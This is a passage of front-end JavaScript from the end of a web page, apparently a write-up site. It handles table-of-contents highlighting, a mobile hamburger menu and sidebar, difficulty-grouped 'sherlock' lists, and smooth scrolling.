                const fromTop = window.scrollY + 120;
                
                tocLinks.forEach(link => {
                    const section = document.querySelector(link.hash);
                    
                    if (section && 
                        section.offsetTop <= fromTop &&
                        section.offsetTop + section.offsetHeight > fromTop) {
                        link.classList.add('active');
                    } else {
                        link.classList.remove('active');
                    }
                });
            }
            
            // Call initially and on scroll
            window.addEventListener('scroll', highlightActiveSection);
            highlightActiveSection();
        }

        // Show error message
        function showError(message) {
            const contentArea = document.querySelector('.writeup-body');
            contentArea.innerHTML = `
                <div class="error-message">
                    <h2>Error</h2>
                    <p>${message}</p>
                </div>
            `;
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Hamburger menu functionality
            const hamburgerMenu = document.querySelector('.hamburger-menu');
            const sidebar = document.querySelector('.sidebar');
            const backdrop = document.querySelector('.backdrop');
            
            hamburgerMenu.addEventListener('click', () => {
                hamburgerMenu.classList.toggle('active');
                sidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            backdrop.addEventListener('click', () => {
                hamburgerMenu.classList.remove('active');
                sidebar.classList.remove('active');
                backdrop.classList.remove('active');
                tocSidebar.classList.remove('active');
            });
            
            // Difficulty buttons functionality
            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
            
            difficultyButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const difficulty = button.getAttribute('data-difficulty');
                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
                    
                    sherlockList.classList.toggle('active');
                });
            });
            
            // Mobile TOC toggle
            const tocToggle = document.querySelector('.toc-toggle');
            const tocSidebar = document.querySelector('.toc-sidebar');
            
            tocToggle.addEventListener('click', () => {
                tocSidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            // Close TOC sidebar when clicking on a link (mobile)
            document.querySelectorAll('.toc-sidebar a').forEach(link => {
                link.addEventListener('click', () => {
                    if (window.innerWidth <= 1024) {
                        tocSidebar.classList.remove('active');
                        backdrop.classList.remove('active');
                    }
                });
            });
        });

        // Add smooth scrolling for TOC links
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.hash) {
                const element = document.querySelector(e.target.hash);
                if (element) {
                    e.preventDefault();
                    window.scrollTo({
                        top: element.offsetTop - 90,
                        behavior: 'smooth'
                    });
                }
            }
        });
    </script>
</body>
</html>